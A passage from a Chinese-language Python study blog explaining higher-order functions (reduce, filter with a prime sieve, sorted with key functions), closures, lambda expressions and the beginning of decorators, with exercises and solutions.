&#x27;4&#x27;: 4, &#x27;5&#x27;: 5, &#x27;6&#x27;: 6, &#x27;7&#x27;: 7, &#x27;8&#x27;: 8, &#x27;9&#x27;: 9&#125;    </span><br><span class="line">    def char2num(c):</span><br><span class="line">        return digits[c]</span><br><span class="line">    def fn(x, y):</span><br><span class="line">        return x * 10 + y</span><br><span class="line">    pos = s.find(&#x27;.&#x27;)</span><br><span class="line">    if pos &gt;= 0:</span><br><span class="line">        return (reduce(fn, map(char2num, s[:pos])) + reduce(fn, map(char2num, s[pos + 1:])) * (10 ** -len(s[pos + 1:]))) </span><br><span class="line">    return reduce(fn, map(char2num, s))</span><br></pre></td></tr></table></figure><p>法二：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">from functools import reduce</span><br><span class="line"></span><br><span class="line">DIGITS = &#123;&#x27;0&#x27;:0, &#x27;1&#x27;:1, &#x27;2&#x27;:2, &#x27;3&#x27;:3, &#x27;4&#x27;:4, &#x27;5&#x27;:5, &#x27;6&#x27;:6, &#x27;7&#x27;:7, &#x27;8&#x27;:8, &#x27;9&#x27;:9&#125;</span><br><span class="line"></span><br><span class="line">def str2float(s):   </span><br><span class="line">    </span><br><span class="line">    def str2num(s):</span><br><span class="line">        return DIGITS[s]</span><br><span class="line">    def fn(x, y):</span><br><span class="line">        return x * 10 + y</span><br><span class="line">    if &#x27;.&#x27; in s:</span><br><span class="line">        nPos = s.find(&#x27;.&#x27;)</span><br><span class="line">        s1 = s[:nPos]</span><br><span class="line">        s2 = s[nPos+1:]</span><br><span class="line">        n1 = reduce(fn, map(str2num, s1))</span><br><span class="line">        n2 = reduce(fn, map(str2num, s2))</span><br><span class="line">        return n1 + 0.1 ** len(s2) * n2</span><br><span class="line">    else:</span><br><span class="line">        return ruduce(fn, map(str2num, s))</span><br></pre></td></tr></table></figure><p>测试：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">print(&#x27;str2float(\&#x27;123.456\&#x27;) =&#x27;, str2float(&#x27;123.456&#x27;))</span><br><span class="line">if abs(str2float(&#x27;123.456&#x27;) - 123.456) &lt; 0.00001:</span><br><span class="line">    print(&#x27;测试成功!&#x27;)</span><br><span class="line">else:</span><br><span class="line">    print(&#x27;测试失败!&#x27;)</span><br></pre></td></tr></table></figure><h3 id="4-2-2-filter"><a href="#4-2-2-filter" class="headerlink" title="4.2.2 filter"></a>4.2.2 filter</h3><p>Python 内建的<code>filter()</code>函数用于过滤序列。</p><p>和<code>map()</code>类似，<code>filter()</code>也接收一个函数和一个序列。和<code>map()</code>不同的是，<code>filter()</code>把传入的函数依次作用于每个元素，然后根据返回值是<code>True</code>还是<code>False</code>决定保留还是丢弃该元素。</p><p>例如，在一个 list 中，删掉偶数，只保留奇数，可以这么写：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def is_odd(n):</span><br><span class="line">    return n % 2 == 1</span><br><span class="line"></span><br><span class="line">list(filter(is_odd, [1, 2, 4, 5, 6, 9, 10, 15]))</span><br><span class="line"># 结果: [1, 5, 9, 15]</span><br></pre></td></tr></table></figure><p>把一个序列中的空字符串删掉，可以这么写：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def not_empty(s):</span><br><span class="line">    return s and s.strip()</span><br><span class="line"></span><br><span class="line">list(filter(not_empty, [&#x27;A&#x27;, &#x27;&#x27;, &#x27;B&#x27;, None, &#x27;C&#x27;, &#x27;  &#x27;]))</span><br><span class="line"># 结果: [&#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;]</span><br></pre></td></tr></table></figure><p>可见用<code>filter()</code>这个高阶函数，关键在于正确实现一个“筛选”函数。</p><p>注意到<code>filter()</code>函数返回的是一个<code>Iterator</code>，也就是一个惰性序列，所以要强迫<code>filter()</code>完成计算结果，需要用<code>list()</code>函数获得所有结果并返回list。</p><h4 id="①-用-filter-求素数"><a href="#①-用-filter-求素数" class="headerlink" title="① 用 filter 求素数"></a>① 用 filter 求素数</h4><p>计算<a href="http://baike.baidu.com/view/10626.htm">素数</a>的一个方法是<a href="http://baike.baidu.com/view/3784258.htm">埃氏筛法</a>，它的算法理解起来非常简单：</p><p>首先，列出从<code>2</code>开始的所有自然数，构造一个序列：</p><p>2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, …</p><p>取序列的第一个数<code>2</code>，它一定是素数，然后用<code>2</code>把序列的<code>2</code>的倍数筛掉：</p><p>3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, …</p><p>取新序列的第一个数<code>3</code>，它一定是素数，然后用<code>3</code>把序列的<code>3</code>的倍数筛掉：</p><p>5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, …</p><p>取新序列的第一个数<code>5</code>，然后用<code>5</code>把序列的<code>5</code>的倍数筛掉：</p><p>7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, …</p><p>不断筛下去，就可以得到所有的素数。</p><p>用 Python 来实现这个算法，可以先构造一个从<code>3</code>开始的奇数序列：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def _odd_iter():</span><br><span class="line">    n = 1</span><br><span class="line">    while True:</span><br><span class="line">        n = n + 2</span><br><span class="line">        yield n</span><br></pre></td></tr></table></figure><p>注意这是一个生成器，并且是一个无限序列。</p><p>然后定义一个筛选函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def _not_divisible(n):</span><br><span class="line">    return lambda x: x % n &gt; 0</span><br></pre></td></tr></table></figure><p>最后，定义一个生成器，不断返回下一个素数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">def primes():</span><br><span class="line">    yield 2</span><br><span class="line">    it = _odd_iter() # 初始序列</span><br><span class="line">    while True:</span><br><span class="line">        n = next(it) # 返回序列的第一个数</span><br><span class="line">        yield n</span><br><span class="line">        it = filter(_not_divisible(n), it) # 构造新序列</span><br></pre></td></tr></table></figure><p>这个生成器先返回第一个素数<code>2</code>，然后，利用<code>filter()</code>不断产生筛选后的新的序列。</p><p>由于<code>primes()</code>也是一个无限序列，所以调用时需要设置一个退出循环的条件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 打印1000以内的素数:</span><br><span class="line">for n in primes():</span><br><span class="line">    if n &lt; 1000:</span><br><span class="line">        print(n)</span><br><span class="line">    else:</span><br><span class="line">        break</span><br></pre></td></tr></table></figure><p>注意到<code>Iterator</code>是惰性计算的序列，所以我们可以用 Python 表示“全体自然数”，“全体素数”这样的序列，而代码非常简洁。</p><blockquote><p>练习题：</p></blockquote><p>回数是指从左向右读和从右向左读都是一样的数，例如<code>12321</code>，<code>909</code>。请利用<code>filter()</code>筛选出回数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def is_palindrome(n):</span><br><span class="line">    return str(n) == str(n)[::-1]</span><br></pre></td></tr></table></figure><p>测试：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 测试:</span><br><span class="line">output = filter(is_palindrome, range(1, 1000))</span><br><span class="line">print(&#x27;1~1000:&#x27;, list(output))</span><br><span class="line">if list(filter(is_palindrome, range(1, 200))) == [1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 22, 33, 44, 55, 66, 77, 88, 99, 101, 111, 121, 131, 141, 151, 161, 171, 181, 191]:</span><br><span class="line">    print(&#x27;测试成功!&#x27;)</span><br><span class="line">else:</span><br><span class="line">    print(&#x27;测试失败!&#x27;)</span><br></pre></td></tr></table></figure><blockquote><p>小结：</p></blockquote><p><code>filter()</code>的作用是从一个序列中筛出符合条件的元素。由于<code>filter()</code>使用了惰性计算，所以只有在取<code>filter()</code>结果的时候，才会真正筛选并每次返回下一个筛出的元素。</p><h3 id="4-2-3-sorted"><a href="#4-2-3-sorted" class="headerlink" title="4.2.3 sorted"></a>4.2.3 sorted</h3><h4 id="①-排序算法"><a href="#①-排序算法" class="headerlink" title="① 排序算法"></a>① 排序算法</h4><p>排序也是在程序中经常用到的算法。无论使用冒泡排序还是快速排序，排序的核心是比较两个元素的大小。如果是数字，我们可以直接比较，但如果是字符串或者两个 dict呢？直接比较数学上的大小是没有意义的，因此，比较的过程必须通过函数抽象出来。</p><p>Python 内置的<code>sorted()</code>函数就可以对 list 进行排序：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sorted([36, 5, -12, 9, -21])</span><br></pre></td></tr></table></figure><p><img src="https://cos.gjcloak.xyz/images01/20200717175610.png" alt="image-20200717175608860" title="image-20200717175608860"></p><p>此外，<code>sorted()</code>函数也是一个高阶函数，它还可以接收一个<code>key</code>函数来实现自定义的排序，例如按绝对值大小排序：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sorted([36, 5, -12, 9, -21], key=abs)</span><br></pre></td></tr></table></figure><p><img src="https://cos.gjcloak.xyz/images01/20200717175739.png" alt="image-20200717175738112" title="image-20200717175738112"></p><p>key 指定的函数将作用于 list 的每一个元素上，并根据 key 函数返回的结果进行排序。对比原始的 list 和经过<code>key=abs</code>处理过的 list：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">list = [36, 5, -12, 9, -21]</span><br><span class="line"></span><br><span class="line">keys = [36, 5,  12, 9,  21]</span><br></pre></td></tr></table></figure><p>然后<code>sorted()</code>函数按照 keys 进行排序，并按照对应关系返回 list 相应的元素：</p><p><img src="https://cos.gjcloak.xyz/images01/20200717180026.png" alt="image-20200717180025283" title="image-20200717180025283"></p><p>我们再看一个字符串排序的例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sorted([&#x27;bob&#x27;, &#x27;about&#x27;, &#x27;Zoo&#x27;, &#x27;Credit&#x27;])</span><br></pre></td></tr></table></figure><p><img src="https://cos.gjcloak.xyz/images01/20200717180117.png" alt="image-20200717180116413" title="image-20200717180116413"></p><p>默认情况下，对字符串排序，是按照 ASCII 的大小比较的，由于<code>&#39;Z&#39; &lt; &#39;a&#39;</code>，结果，大写字母<code>Z</code>会排在小写字母<code>a</code>的前面。</p><p>现在，我们提出排序应该忽略大小写，按照字母序排序。要实现这个算法，不必对现有代码大加改动，只要我们能用一个 key 函数把字符串映射为忽略大小写排序即可。忽略大小写来比较两个字符串，实际上就是先把字符串都变成大写（或者都变成小写），再比较。</p><p>这样，我们给<code>sorted</code>传入 key 函数，即可实现忽略大小写的排序：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sorted([&#x27;bob&#x27;, &#x27;about&#x27;, &#x27;Zoo&#x27;, &#x27;Credit&#x27;], key=str.lower)</span><br></pre></td></tr></table></figure><p><img src="https://cos.gjcloak.xyz/images01/20200717180306.png" alt="image-20200717180305192" title="image-20200717180305192"></p><p>要进行反向排序，不必改动 key 函数，可以传入第三个参数<code>reverse=True</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sorted([&#x27;bob&#x27;, &#x27;about&#x27;, &#x27;Zoo&#x27;, &#x27;Credit&#x27;], key=str.lower, reverse=True)</span><br></pre></td></tr></table></figure><p><img src="https://cos.gjcloak.xyz/images01/20200717180421.png" alt="image-20200717180420727" title="image-20200717180420727"></p><p>从上述例子可以看出，高阶函数的抽象能力是非常强大的，而且，核心代码可以保持得非常简洁。</p><blockquote><p>小结：</p></blockquote><p><code>sorted()</code>也是一个高阶函数。用<code>sorted()</code>排序的关键在于实现一个映射函数。</p><blockquote><p>练习题：</p></blockquote><p>假设我们用一组 tuple 表示学生名字和成绩：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">L = [(&#x27;Bob&#x27;, 75), (&#x27;Adam&#x27;, 92), (&#x27;Bart&#x27;, 66), (&#x27;Lisa&#x27;, 88)]</span><br></pre></td></tr></table></figure><p>请用<code>sorted()</code>对上述列表分别按名字升序排序，再按成绩从高到低排序。</p><p><strong>（1）按名字升序排序</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">L = [(&#x27;Bob&#x27;, 75), (&#x27;Adam&#x27;, 92), (&#x27;Bart&#x27;, 66), (&#x27;Lisa&#x27;, 88)]</span><br><span class="line">def by_name(t):</span><br><span class="line">    return t[0]</span><br><span class="line">L2 = sorted(L, key=by_name)</span><br><span class="line">print(L2)</span><br></pre></td></tr></table></figure><p><img src="https://cos.gjcloak.xyz/images01/20200717205003.png" alt="image-20200717205002143" title="image-20200717205002143"></p><p><strong>（2）按成绩从高到低排序</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">L = [(&#x27;Bob&#x27;, 75), (&#x27;Adam&#x27;, 92), (&#x27;Bart&#x27;, 66), (&#x27;Lisa&#x27;, 88)]</span><br><span class="line">def by_name(t):</span><br><span class="line">    return -t[1]</span><br><span class="line">L2 = sorted(L, key=by_name)</span><br><span class="line">print(L2)</span><br></pre></td></tr></table></figure><p><img src="https://cos.gjcloak.xyz/images01/20200717205111.png" alt="image-20200717205111010" title="image-20200717205111010"></p><h2 id="4-3-返回函数"><a href="#4-3-返回函数" class="headerlink" title="4.3 返回函数"></a>4.3 返回函数</h2><h3 id="4-3-1-函数作为返回值"><a href="#4-3-1-函数作为返回值" class="headerlink" title="4.3.1 函数作为返回值"></a>4.3.1 函数作为返回值</h3><p>高阶函数除了可以接受函数作为参数外，还可以把函数作为结果值返回。</p><p>我们来实现一个可变参数的求和。通常情况下，求和的函数是这样定义的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def calc_sum(*args):</span><br><span class="line">    ax = 0</span><br><span class="line">    for n in args:</span><br><span class="line">        ax = ax + n</span><br><span class="line">    return ax</span><br></pre></td></tr></table></figure><p>但是，如果不需要立刻求和，而是在后面的代码中，根据需要再计算怎么办？可以不返回求和的结果，而是返回求和的函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">def lazy_sum(*args):</span><br><span class="line">    def sum():</span><br><span class="line">        ax = 0</span><br><span class="line">        for n in args:</span><br><span class="line">            ax = ax + n</span><br><span class="line">        return ax</span><br><span class="line">    return sum</span><br></pre></td></tr></table></figure><p>当我们调用<code>lazy_sum()</code>时，返回的并不是求和结果，而是求和函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; f = lazy_sum(1, 3, 5, 7, 9)</span><br><span class="line">&gt;&gt;&gt; f</span><br><span class="line">&lt;function lazy_sum.&lt;locals&gt;.sum at 0x101c6ed90&gt;</span><br></pre></td></tr></table></figure><p>调用函数<code>f</code>时，才真正计算求和的结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; f()</span><br><span class="line">25</span><br></pre></td></tr></table></figure><p><img src="https://cos.gjcloak.xyz/images01/20200718150943.png" alt="image-20200718150942158" title="image-20200718150942158"></p><p>在这个例子中，我们在函数<code>lazy_sum</code>中又定义了函数<code>sum</code>，并且，内部函数<code>sum</code>可以引用外部函数<code>lazy_sum</code>的参数和局部变量，当<code>lazy_sum</code>返回函数<code>sum</code>时，相关参数和变量都保存在返回的函数中，这种称为“闭包（Closure）”的程序结构拥有极大的威力。</p><p>请再注意一点，当我们调用<code>lazy_sum()</code>时，每次调用都会返回一个新的函数，即使传入相同的参数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; f1 = lazy_sum(1, 3, 5, 7, 9)</span><br><span class="line">&gt;&gt;&gt; f2 = lazy_sum(1, 3, 5, 7, 9)</span><br><span class="line">&gt;&gt;&gt; f1==f2</span><br><span class="line">False</span><br><span class="line">&gt;&gt;&gt; f1()==f2()</span><br><span class="line">True</span><br></pre></td></tr></table></figure><p><code>f1()</code>和<code>f2()</code>的调用结果互不影响。</p><h3 id="4-3-2-闭包"><a href="#4-3-2-闭包" class="headerlink" title="4.3.2 闭包"></a>4.3.2 闭包</h3><p>注意到返回的函数在其定义内部引用了局部变量<code>args</code>，所以，当一个函数返回了一个函数后，其内部的局部变量还被新函数引用，所以，闭包用起来简单，实现起来可不容易。</p><p>另一个需要注意的问题是，返回的函数并没有立刻执行，而是直到调用了<code>f()</code>才执行。我们来看一个例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">def count():</span><br><span class="line">    fs = []</span><br><span class="line">    for i in range(1, 4):</span><br><span class="line">        def f():</span><br><span class="line">             return i*i</span><br><span class="line">        fs.append(f)</span><br><span class="line">    return fs</span><br><span class="line"></span><br><span class="line">f1, f2, f3 = count()</span><br></pre></td></tr></table></figure><p>在上面的例子中，每次循环，都创建了一个新的函数，然后，把创建的 3 个函数都返回了。</p><p>你可能认为调用<code>f1()</code>，<code>f2()</code>和<code>f3()</code>结果应该是<code>1</code>，<code>4</code>，<code>9</code>，但实际结果是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; f1()</span><br><span class="line">9</span><br><span class="line">&gt;&gt;&gt; f2()</span><br><span class="line">9</span><br><span class="line">&gt;&gt;&gt; f3()</span><br><span class="line">9</span><br></pre></td></tr></table></figure><p>全部都是<code>9</code>！原因就在于返回的函数引用了变量<code>i</code>，但它并非立刻执行。等到 3 个函数都返回时，它们所引用的变量<code>i</code>已经变成了<code>3</code>，因此最终结果为<code>9</code>。</p><p>!&gt; 返回闭包时牢记一点：返回函数不要引用任何循环变量，或者后续会发生变化的变量。</p><p>如果一定要引用循环变量怎么办？方法是再创建一个函数，用该函数的参数绑定循环变量当前的值，无论该循环变量后续如何更改，已绑定到函数参数的值不变：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">def count():</span><br><span class="line">    def f(j):</span><br><span class="line">        def g():</span><br><span class="line">            return j*j</span><br><span class="line">        return g</span><br><span class="line">    fs = []</span><br><span class="line">    for i in range(1, 4):</span><br><span class="line">        fs.append(f(i)) # f(i)立刻被执行，因此i的当前值被传入f()</span><br><span class="line">    return fs</span><br></pre></td></tr></table></figure><p>再看看结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; f1, f2, f3 = count()</span><br><span class="line">&gt;&gt;&gt; f1()</span><br><span class="line">1</span><br><span class="line">&gt;&gt;&gt; f2()</span><br><span class="line">4</span><br><span class="line">&gt;&gt;&gt; f3()</span><br><span class="line">9</span><br></pre></td></tr></table></figure><p>缺点是代码较长，可利用 lambda 函数缩短代码。</p><blockquote><p>练习题：</p></blockquote><p>利用闭包返回一个计数器函数，每次调用它返回递增整数：</p><ul><li>法一：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">def createCounter():</span><br><span class="line">    i = 0</span><br><span class="line">    def counter():</span><br><span class="line">        nonlocal i  #这句声明是闭包函数应用同名变量的重点。</span><br><span class="line">        while True:</span><br><span class="line">            i = i + 1</span><br><span class="line">            return i</span><br><span class="line">    return counter</span><br></pre></td></tr></table></figure><ul><li>法二：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 选择数值可变但是地址不变的变量类型——数组</span><br><span class="line">def createCounter():</span><br><span class="line">    i = [0] # 初始化数组    </span><br><span class="line">    def counter():</span><br><span class="line">        i[0] += 1 #不修改数组， 尽修改数组中元素数值， 数组的地址不变        </span><br><span class="line">        return i[0]</span><br><span class="line">    return counter</span><br></pre></td></tr></table></figure><ul><li>法三：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 也可以选择dict类型变量，与数组同理， 主要不改变变量引用地址即可</span><br><span class="line">def createCounter():</span><br><span class="line">    i = &#123;&#x27;a&#x27;:0&#125;</span><br><span class="line">    def counter():</span><br><span class="line">        i[&#x27;a&#x27;] += 1        </span><br><span class="line">        return i[&#x27;a&#x27;]</span><br><span class="line">    return counter</span><br></pre></td></tr></table></figure><ul><li>测试：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 测试:</span><br><span class="line">counterA = createCounter()</span><br><span class="line">print(counterA(), counterA(), counterA(), counterA(), counterA()) # 1 2 3 4 5</span><br><span class="line">counterB = createCounter()</span><br><span class="line">if [counterB(), counterB(), counterB(), counterB()] == [1, 2, 3, 4]:</span><br><span class="line">    print(&#x27;测试通过!&#x27;)</span><br><span class="line">else:</span><br><span class="line">    print(&#x27;测试失败!&#x27;)</span><br></pre></td></tr></table></figure><blockquote><p>小结：</p></blockquote><p>一个函数可以返回一个计算结果，也可以返回一个函数。</p><p>返回一个函数时，牢记该函数并未执行，返回函数中不要引用任何可能会变化的变量。</p><h2 id="4-4-匿名函数"><a href="#4-4-匿名函数" class="headerlink" title="4.4 匿名函数"></a>4.4 匿名函数</h2><p>当我们在传入函数时，有些时候，不需要显式地定义函数，直接传入匿名函数更方便。</p><p>在 Python 中，对匿名函数提供了有限支持。还是以<code>map()</code>函数为例，计算 $f(x)&#x3D;x^2$ 时，除了定义一个<code>f(x)</code>的函数外，还可以直接传入匿名函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">list(map(lambda x: x * x, [1, 2, 3, 4, 5, 6, 7, 8, 9]))</span><br></pre></td></tr></table></figure><p>通过对比可以看出，匿名函数<code>lambda x: x * x</code>实际上就是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def f(x):</span><br><span class="line">    return x * x</span><br></pre></td></tr></table></figure><p>关键字<code>lambda</code>表示匿名函数，冒号前面的<code>x</code>表示函数参数。</p><p>匿名函数有个限制，就是只能有一个表达式，不用写<code>return</code>，返回值就是该表达式的结果。</p><p>用匿名函数有个好处，因为函数没有名字，不必担心函数名冲突。此外，匿名函数也是一个函数对象，也可以把匿名函数赋值给一个变量，再利用变量来调用该函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; f = lambda x: x * x</span><br><span class="line">&gt;&gt;&gt; f</span><br><span class="line">&lt;function &lt;lambda&gt; at 0x101c6ef28&gt;</span><br><span class="line">&gt;&gt;&gt; f(5)</span><br><span class="line">25</span><br></pre></td></tr></table></figure><p>同样，也可以把匿名函数作为返回值返回，比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def build(x, y):</span><br><span class="line">    return lambda: x * x + y * y</span><br></pre></td></tr></table></figure><blockquote><p>练习题：</p></blockquote><p>请用匿名函数改造下面的代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def is_odd(n):</span><br><span class="line">    return n % 2 == 1</span><br><span class="line"></span><br><span class="line">L = list(filter(is_odd, range(1, 20)))</span><br><span class="line">print(L)</span><br></pre></td></tr></table></figure><p>用匿名函数改造：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">L = list(filter(lambda x: x %2 == 1, range(1, 20)))</span><br><span class="line">print(L)</span><br></pre></td></tr></table></figure><p>那如果用列表生成式改造呢？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">L = [x for x in range(1,20) if x % 2 == 1]</span><br><span class="line">print(L)</span><br></pre></td></tr></table></figure><blockquote><p>小结：</p></blockquote><p>Python 对匿名函数的支持有限，只有一些简单的情况下可以使用匿名函数。</p><h2 id="4-5-装饰器"><a href="#4-5-装饰器" class="headerlink" title="4.5 装饰器"></a>4.5 装饰器</h2><p>由于函数也是一个对象，而且函数对象可以被赋值给变量，所以，通过变量也能调用该函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">def now():</span><br><span class="line">    print(&#x27;2020-07-19&#x27;)</span><br><span class="line">f = now</span><br><span class="line">f() # 结果：2020-07-19</span><br></pre></td></tr></table></figure><p>函数对象有一个<code>__name__</code>属性，可以拿到函数的名字：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; now.__name__</span><br><span class="line">&#x27;now&#x27;</span><br><span class="line">&gt;&gt;&gt; f.__name__</span><br><span class="line">&#x27;now&#x27;</span><br></pre></td></tr></table></figure><p>现在，假设我们要增强<code>now()</code>函数的功能，比如，在函数调用前后自动打印日志，但又不希望修改<code>now()</code>函数的定义，这种在代码运行期间动态增加功能的方式，称之为“装饰器”（Decorator）。</p><p>本质上，decorator 就是一个返回函数的高阶函数。所以，我们要定义一个能打印日志的 